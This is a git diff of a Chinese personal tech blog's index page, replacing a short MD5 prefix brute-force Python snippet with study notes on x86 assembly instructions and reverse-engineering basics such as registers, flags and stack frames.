@@ -7,7 +7,922 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">84</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/30/cve%E9%9B%86%E5%90%88/">cve集合</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-30</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/22/python%E5%AD%A6%E4%B9%A0/">python学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-22</time><div class="content"><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = [<span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">goal = <span class="string">'cba0c'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">			<span class="keyword">for</span> m <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">				<span class="keyword">for</span> n <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">					whole = dic[i]+dic[j]+dic[k]+dic[m]+dic[n]</span><br><span class="line">					res = hashlib.md5(whole.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">					<span class="keyword">if</span>(res[<span class="number">0</span>:<span class="number">5</span>]==goal):</span><br><span class="line">						print(whole)</span><br></pre></td></tr></table></figure>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">87</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">汇编期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-30</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1.png" alt="1"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2.png" alt="2"></p>
+<p>间接寻址</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3.png" alt="3"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4.png" alt="4"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5.png" alt="5"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6.png" alt="6"></p>
+<p>loop</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7.png" alt="7"></p>
+<p>例子</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8.png" alt="8"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9.png" alt="9"></p>
+<h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="pop-push"><a href="#pop-push" class="headerlink" title="pop/push"></a>pop/push</h2><p>堆栈是预先分配好的一段内存地址，其中<strong>栈底的地址最大</strong>。</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-1.png" alt="6-1"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-2.png" alt="6-2"></p>
+<blockquote>
+<p>在vs2017调试的时候，如果要看字符串的值，需要输入字符串的首地址。</p>
+<p>比如查看名为Name的字符串，可以快速监视  <code>&amp;Name</code></p>
+</blockquote>
+<h2 id="call-ret"><a href="#call-ret" class="headerlink" title="call/ret"></a>call/ret</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-4.png" alt="6-4"></p>
+<h2 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-5.png" alt="6-5"></p>
+<h2 id="寄存器实现参数传递"><a href="#寄存器实现参数传递" class="headerlink" title="寄存器实现参数传递"></a>寄存器实现参数传递</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-6.png" alt="6-6"></p>
+<h3 id="Uses的使用【在某一过程里简化压栈和出栈】"><a href="#Uses的使用【在某一过程里简化压栈和出栈】" class="headerlink" title="Uses的使用【在某一过程里简化压栈和出栈】"></a>Uses的使用【在某一过程里简化压栈和出栈】</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-7.png" alt="6-7"></p>
+<h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-1.png" alt="7-1"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-3.png" alt="7-3"></p>
+<h2 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-2.png" alt="7-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">支持的格式：</span><br><span class="line">AND reg , reg</span><br><span class="line">AND reg , mem</span><br><span class="line">AND reg , imm</span><br><span class="line">AND mem , reg</span><br><span class="line">AND mem , imm</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="条件跳转指令"><a href="#条件跳转指令" class="headerlink" title="条件跳转指令"></a>条件跳转指令</h2><h3 id="测试指令【cmp、test】"><a href="#测试指令【cmp、test】" class="headerlink" title="测试指令【cmp、test】"></a>测试指令【cmp、test】</h3><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>TEST a , b：也是比较a与b，本质是a&amp;b，不修改a和b，如果a&amp;b=0，则zf标志位置1。</p>
+<h4 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h4><p>CMP a , b：比较a与b，本质是a-b，不修改a和b，修改部分标志寄存器，配合跳转指令使用</p>
+<h3 id="基于特定的标志位"><a href="#基于特定的标志位" class="headerlink" title="基于特定的标志位"></a>基于特定的标志位</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-4.png" alt="7-4"></p>
+<h3 id="基于判断两操作数是否相等"><a href="#基于判断两操作数是否相等" class="headerlink" title="基于判断两操作数是否相等"></a>基于判断两操作数是否相等</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-5.png" alt="7-5"></p>
+<h3 id="基于无符号操作数的结果比较的"><a href="#基于无符号操作数的结果比较的" class="headerlink" title="基于无符号操作数的结果比较的"></a>基于无符号操作数的结果比较的</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-6.png" alt="7-6"></p>
+<h3 id="基于有符号操作数的结果比较的"><a href="#基于有符号操作数的结果比较的" class="headerlink" title="基于有符号操作数的结果比较的"></a>基于有符号操作数的结果比较的</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-7.png" alt="7-7"></p>
+<h2 id="条件循环指令"><a href="#条件循环指令" class="headerlink" title="条件循环指令"></a>条件循环指令</h2><p>指令格式：LOOPZ 目的地址</p>
+<p>目的地址跟当前指令的距离在-128~127之间</p>
+<p>LOOPE与LOOPZ等价</p>
+<p>循环条件：<strong>ecx不等于0</strong>并且<strong>ZF标志位为1</strong>时跳转，即与LOOP指令不同的地方就是要同时判别ZF标志位</p>
+<p>LOOPNZ与LOOPZ类似，只是循环条件是ecx不等于0并且ZF标志位为0时跳转（书中的说明有误）</p>
+<h2 id="决策伪指令"><a href="#决策伪指令" class="headerlink" title="决策伪指令"></a>决策伪指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.IF  condition1</span><br><span class="line">     statements</span><br><span class="line">[.ELSEIF  condition2</span><br><span class="line">    statements ]</span><br><span class="line">[.ELSE</span><br><span class="line">    statements ]</span><br><span class="line">.ENDIF</span><br><span class="line"></span><br><span class="line">.IF  (DL &lt; 0 ) || (DL &gt; 79)</span><br><span class="line">.IF (DL &gt; &#x3D;0 ) &amp;&amp; (DL &lt;&#x3D; 79)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.REPEAT</span><br><span class="line">    statements</span><br><span class="line">.UNTIL  condition</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.WHILE </span><br><span class="line">    statements</span><br><span class="line">.ENDW</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="第七章【整数算术指令】"><a href="#第七章【整数算术指令】" class="headerlink" title="第七章【整数算术指令】"></a>第七章【整数算术指令】</h1><h2 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h2><p>逻辑移位和算数移位，左移无区别，主要是右移存在区别。</p>
+<h3 id="左移【SHL、SAL】"><a href="#左移【SHL、SAL】" class="headerlink" title="左移【SHL、SAL】"></a>左移【SHL、SAL】</h3><p>左移是一种特殊的快速乘法，左移n位，相当于乘以2^n</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHL 目的操作数，移位位数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8-1.png" alt="8-1"></p>
+<h3 id="右移【SHR、SAR】"><a href="#右移【SHR、SAR】" class="headerlink" title="右移【SHR、SAR】"></a>右移【SHR、SAR】</h3><h4 id="逻辑右移【SHR】："><a href="#逻辑右移【SHR】：" class="headerlink" title="逻辑右移【SHR】："></a>逻辑右移【SHR】：</h4><p>功能：将目的操作数逻辑右移，左边移出的位添0，最低位被移出，复制到CF位中</p>
+<p>SHR可以实现无符号数的快速除法</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8-2.png" alt="8-2"></p>
+<h4 id="算数右移【SAR】："><a href="#算数右移【SAR】：" class="headerlink" title="算数右移【SAR】："></a>算数右移【SAR】：</h4><p>在右移的过程中，最高位保持不变。</p>
+<p>SAR可以实现有符号数的快速除法<img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8-3.png" alt="8-3"></p>
+<h2 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8-4.png" alt="8-4"></p>
+<p>其中RCL和RCR是带进位循环左移和右移，即将CF位移到另一边起始位置，再将最后一位移到CF位。</p>
+<p>而ROL和ROR是将最后一位移到CF和另一边第一位。</p>
+<h2 id="移位和OF位"><a href="#移位和OF位" class="headerlink" title="移位和OF位"></a>移位和OF位</h2><p>在这些移位指令中，当<strong>移的位是1位</strong>时，当数的<strong>符号位发生改变</strong>，就会将溢出位OF置位1，否则清0。</p>
+<p>如果移的是多位，则OF位无定义。</p>
+<h2 id="SHLD-SHRD"><a href="#SHLD-SHRD" class="headerlink" title="SHLD/SHRD"></a>SHLD/SHRD</h2><p>SHLD 目的操作数，源操作数，移位位数</p>
+<p>功能：将目的操作数移位，</p>
+<p>左移时，用源操作数的高位填充目的操作数的低位；</p>
+<p>右移时，用源操作数的低位填充目的操作数的高位。</p>
+<p>源操作数自身值不改变。<img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8-5.png" alt="8-5"></p>
+<h2 id="乘除运算"><a href="#乘除运算" class="headerlink" title="乘除运算"></a>乘除运算</h2><h3 id="无符号乘MUL"><a href="#无符号乘MUL" class="headerlink" title="无符号乘MUL"></a>无符号乘MUL</h3><p>格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MUL r&#x2F;m8</span><br><span class="line">MUL r&#x2F;m16</span><br><span class="line">MUL r&#x2F;m32</span><br></pre></td></tr></table></figure>
+
+<p>指令中只有一个操作数，另一个操作数是隐含的</p>
+<ul>
+<li>当操作数8位时，表示这个8位数与AL相乘，结果放在AX中</li>
+<li>当操作数是16位时，表示这个16位数与AX相乘，结果放在DX和AX中，DX中放高16位，AX中放低16位</li>
+<li>当操作数是32位时，表示这个32位数与EAX相乘，结果放在EDX和EAX中，EDX中放高32位，EAX中放低32位</li>
+</ul>
+<p>当结果的高半部分为非0时，CF和OF置位，否则清0</p>
+<h3 id="有符号乘法IMUL"><a href="#有符号乘法IMUL" class="headerlink" title="有符号乘法IMUL"></a>有符号乘法IMUL</h3><p>如果结果的高一半不是低一半的符号扩展，OF，CF置位</p>
+<h4 id="双操作数"><a href="#双操作数" class="headerlink" title="双操作数"></a>双操作数</h4><p>功能：两个操作数相乘，结果存到第一个操作数中</p>
+<p>如果第一个操作数存不下结果，OF、CF置位。</p>
+<h4 id="三操作数"><a href="#三操作数" class="headerlink" title="三操作数"></a>三操作数</h4><p>功能：第二、三两个操作数相乘，结果存到第一个操作数中</p>
+<p>如果第一个操作数存不下结果，OF、CF置位。</p>
+<h3 id="无符号除法指令DIV"><a href="#无符号除法指令DIV" class="headerlink" title="无符号除法指令DIV"></a>无符号除法指令DIV</h3><p>实现整除运算，结果包括两项，一项为商，一项为余数。</p>
+<p>格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DIV r&#x2F;m8  AX &#x2F; op8 &#x3D; AL(商) …AH(余数)</span><br><span class="line">DIV r&#x2F;m16 DX:AX&#x2F;op16 &#x3D; AX…DX</span><br><span class="line">DIV r&#x2F;m32 EDX:EAX&#x2F;op32&#x3D;EAX…EDX</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="有符号整数除法IDIV"><a href="#有符号整数除法IDIV" class="headerlink" title="有符号整数除法IDIV"></a>有符号整数除法IDIV</h3><p>有符号除法和无符号除法的用法基本相似。但要注意的隐含参数在进行除法操作前往往要进行符号扩展</p>
+<p>符号扩展指令</p>
+<p>共有三条符号扩展指令，其操作数在指令中不给出，均为隐含的寄存器</p>
+<ul>
+<li>CBW  将AL符号扩展到AX</li>
+<li>CWD  将AX符号扩展到DX:AX</li>
+<li>CDQ  将EAX符号扩展到EDX:EAX</li>
+</ul>
+<h2 id="扩展加法和减法"><a href="#扩展加法和减法" class="headerlink" title="扩展加法和减法"></a>扩展加法和减法</h2><ul>
+<li>ADC  带进位加</li>
+<li>SBB 带借位减</li>
+</ul>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/">逆向工程核心原理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><div class="content"><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1-1.jpg" alt="1-1"></p>
+<p>大端序【更直观】：数据的低位存储在地址的高位。</p>
+<p>小端序【符合人类思维】：数据的低位存储在地址的低位。【Intel X86 CPU】</p>
+<blockquote>
+<p>注：对于char[]字符串，字符数组在内存中是连续的，所以无论大端序还是小端序，存储顺序都是相同的。</p>
+</blockquote>
+<p>用以上数据做一个测试，拖进ollydbg：</p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1-2.png" alt="1-2"></p>
+<p>可以发现这里使用的是小端序。</p>
+<h1 id="IA-32寄存器【p36】"><a href="#IA-32寄存器【p36】" class="headerlink" title="IA-32寄存器【p36】"></a>IA-32寄存器【p36】</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>EAX：【针对操作数和结果数据】累加器</p>
+<blockquote>
+<p>EAX(0-31)：32位</p>
+<p>AX(0-15)：16位</p>
+<p>AH(8-15)：8位</p>
+<p>AL(0-7)：8位</p>
+</blockquote>
+<p>EBX：【DS段的数据指针】基址寄存器</p>
+<p>ECX：【字符串和循环操作】计数器</p>
+<p>EDX：【I/O指针】数据寄存器</p>
+<p>EBP：扩展基址寄存器</p>
+<p>ESI：源变址寄存器</p>
+<p>EDI：目的变址寄存器</p>
+<p>ESP：栈指针寄存器</p>
+<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>CS：代码段寄存器</p>
+<p>SS：栈段寄存器</p>
+<p>DS：数据段寄存器</p>
+<p>ES：附加（数据）段寄存器</p>
+<p>FS：数据段寄存器</p>
+<p>GS：数据段寄存器</p>
+<h2 id="程序状态与控制寄存器"><a href="#程序状态与控制寄存器" class="headerlink" title="程序状态与控制寄存器"></a>程序状态与控制寄存器</h2><h3 id="EFLAGS：标志寄存器"><a href="#EFLAGS：标志寄存器" class="headerlink" title="EFLAGS：标志寄存器"></a>EFLAGS：标志寄存器</h3><p>ZF：零标志【运算结果为0，该位为1】</p>
+<p>OF：溢出标志【有符号整数溢出时为1/MSB（Most SIgnificant Bit 最高有效位）改变时为1】</p>
+<p>CF：进位标志【无符号整数溢出时为1】</p>
+<blockquote>
+<p>PF（parity flag）：奇偶标志位。这个位的判断需要我们将结果转为二进制来看，如果结果的低8位中有偶数个1，就将PF的值置1；如果是奇数个1，就置0。要注意的是一定是结果的低8位。</p>
+<p>AF（auxiliary flag）：辅助进位标志位。这个位用的不多，所以书上也没有讲，我就简单的查了一下资料。这个位表示加减法做到一半时有没有形成进位/借位，如果有则AF=1。这么说谁都听不懂，所以我们举个例子来说下。例如 MOV AL,00001110 MOV BL,00001000 ADD AL,BL 最后结果为AL=00010110这就是低四位向高四位进位。反之在减法中第三位不够减向第四位借位(注意数位是从第0位开始数的)叫低四位向高四位借位!像前面的AL中前四位为高四位,后四位为低四位。例如,当两个字节相加时,如果从低4位向高4位有进位时,则AF=1。</p>
+<p>ZF（zero flag）：零标志位。这个位就很简单了，判断结果是不是0。如果结果为0，就置1；不为0，就置0。</p>
+<p>SF（sign flag）：符号标志位。既然是符号标志位，就是对有符号数据来说的。如果结果为负，就置1；结果为正，就置0。</p>
+<p>TF（timer overblow flag）：定时器溢出标志。这个位主要是用来在debug中进行-t指令时使用的。当cpu在执行完一条指令后，如果检测到TF位的值为1，则产生单步中断，引发中断过程。通过这个位，我们就可以在debug中对程序进行单步跟踪。</p>
+<p>IF（interrupt flag）：中断允许标志位。当IF=1时，cpu在执行完当前指令后响应中断，引发中断过程；当IF=0时，则不响应可屏蔽中断。</p>
+<p>DF（direction flag）：<strong>方向标志位</strong>。在串处理指令中，控制每次操作后，si（指向原始偏移地址）、di（指向目标偏移地址）的增减。当DF=0时，每次操作后，si、di递增；DF=1时，每次操作后，si、di递减。我们可以使用cld指令将DF的值置为0，使用std指令将DF的值置为1。DF需要与rep、movsb等指令配合使用。</p>
+<p>OF（overflow flag）：溢出标志位。这个位是用来判断有没有溢出的。注意溢出这个概念只对于有符号数据而言，就如同进位只对于无符号数据而言。当OF=0时，说明没有溢出；当OF=1时，说明溢出了。</p>
+</blockquote>
+<h2 id="指令寄存器"><a href="#指令寄存器" class="headerlink" title="指令寄存器"></a>指令寄存器</h2><p>EIP【Instruction Pointer】：CPU每执行完一条指令，就通过EIP寄存器读取并执行下一条命令。</p>
+<h1 id="对一个简单程序的栈帧分析"><a href="#对一个简单程序的栈帧分析" class="headerlink" title="对一个简单程序的栈帧分析"></a>对一个简单程序的栈帧分析</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">add</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> x = a, y = b;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, add(a, b));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在栈中，EBP作为栈底，ESP作为栈顶，EIP为指令指针。</p>
+<p>刚开始的寄存器和栈是这样的：</p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-1.png" alt="2-1"></p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-2.png" alt="2-2"></p>
+<p>1.从入口main函数进去，先配置好栈底和栈顶指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push EBP</span><br><span class="line">mov EBP,ESP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时，可以在栈窗口这样设置相对地址</p>
+<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-3.png" alt="2-3"></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+</tbody></table>
+<p>2.将栈顶向地址小的地方移动8个字节，来给main函数里的a，b变量分配空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,8</span><br></pre></td></tr></table></figure>
+
+<p>然后赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">long a &#x3D; 1, b &#x3D; 2;</span><br></pre></td></tr></table></figure>
+
